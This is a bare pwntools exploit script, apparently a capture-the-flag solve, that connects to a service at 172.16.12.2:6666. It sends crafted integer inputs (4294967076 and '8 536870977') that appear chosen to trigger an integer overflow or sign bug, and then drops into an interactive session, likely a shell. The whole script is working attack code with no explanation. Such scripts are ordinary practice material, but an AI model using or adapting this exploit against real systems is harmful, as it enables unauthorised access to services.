from pwn import *
#context(os='linux',arch='amd64')
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh', '-c']

name = './pwn'
p = remote('172.16.12.2',6666)
#p = process(name)
elf = ELF(name)
if args.G:
    gdb.attach(p)

p.recvuntil("x: \n")
p.sendline("300")
p.recvuntil("y: \n")
p.sendline("4294967076")

p.recvuntil("Please input x and y:\n")
p.sendline("8 536870977")

p.interactive()